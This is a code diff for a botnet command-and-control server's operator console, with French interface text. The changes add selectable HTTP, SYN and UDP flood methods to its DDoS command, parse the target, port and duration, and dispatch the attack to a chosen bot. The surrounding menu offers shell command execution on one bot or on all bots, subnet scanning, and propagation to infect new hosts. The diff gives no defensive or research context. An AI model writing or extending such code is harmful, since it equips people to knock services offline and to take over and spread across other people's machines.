@@ -184,14 +184,19 @@ def command_interface():
         print("2. info <id> - Affiche les informations détaillées d'un bot")
         print("3. cmd <id> <commande> - Exécute une commande shell sur un bot spécifique")
         print("4. broadcast <commande> - Exécute une commande sur tous les bots")
-        print("5. ddos <id> <cible:port> <durée> - Lance une attaque DDoS depuis un bot")
-        print("6. ddos-all <cible:port> <durée> - Lance une attaque DDoS depuis tous les bots")
-        print("7. scan <id> <sous-réseau> - Scanne un sous-réseau depuis un bot")
-        print("8. propagate <id> <cible> - Propage le bot à une nouvelle cible")
-        print("9. ping <id> - Vérifie si un bot est toujours actif")
-        print("10. ping-all - Vérifie tous les bots")
-        print("11. kill <id> - Déconnecte un bot")
-        print("12. exit - Quitte le serveur")
+        print("5. ddos <id> <cible[:port]> <méthode> <durée> - Lance une attaque DDoS")
+        print("    Méthodes: http, syn, udp")
+        print("    Exemples:")
+        print("        ddos 0 exemple.com:80 http 300")
+        print("        ddos 1 1.2.3.4 syn 60")
+        print("        ddos 2 target.com udp 120")
+        print("6. scan <id> <sous-réseau> - Scanne un sous-réseau (ex: 192.168.1)")
+        print("7. propagate <id> <cible> - Tente d'infecter une cible")
+        print("8. ping <id> - Vérifie si un bot est toujours connecté")
+        print("9. ping-all - Vérifie tous les bots")
+        print("10. kill <id> - Déconnecte un bot")
+        print("11. exit - Arrête le serveur C2")
+        print("12. help - Affiche l'aide")
         
         cmd = input("\n> ")
         cmd_parts = cmd.strip().split()
@@ -240,15 +245,29 @@ def command_interface():
             command = "EXEC " + " ".join(cmd_parts[1:])
             broadcast_command(command)
         
-        elif cmd_parts[0] == "ddos" and len(cmd_parts) > 3:
+        elif cmd_parts[0] == "ddos" and len(cmd_parts) > 4:
             try:
                 bot_index = int(cmd_parts[1])
                 target = cmd_parts[2]
-                duration = cmd_parts[3]
-                command = f"DDOS {target} {duration}"
+                method = cmd_parts[3].lower()
+                duration = int(cmd_parts[4])
+                
+                if method not in ["http", "syn", "udp"]:
+                    print("[!] Méthode invalide. Utilisez: http, syn, ou udp")
+                    continue
+                
+                if ':' in target:
+                    host, port = target.split(':')
+                    command = f"DDOS {host} {port} {duration} {method}"
+                else:
+                    default_port = 80 if method == "http" else 0
+                    command = f"DDOS {target} {default_port} {duration} {method}"
+                
                 send_command_to_bot(bot_index, command)
+                print(f"[+] Attaque {method.upper()} lancée contre {target} pour {duration} secondes")
             except ValueError:
-                print("[!] Format invalide. Utilisez: ddos <id> <cible:port> <durée>")
+                print("[!] Format invalide. Utilisez: ddos <id> <cible[:port]> <méthode> <durée>")
+                print("    Méthodes disponibles: http, syn, udp")
         
         elif cmd_parts[0] == "ddos-all" and len(cmd_parts) > 2:
             target = cmd_parts[1]
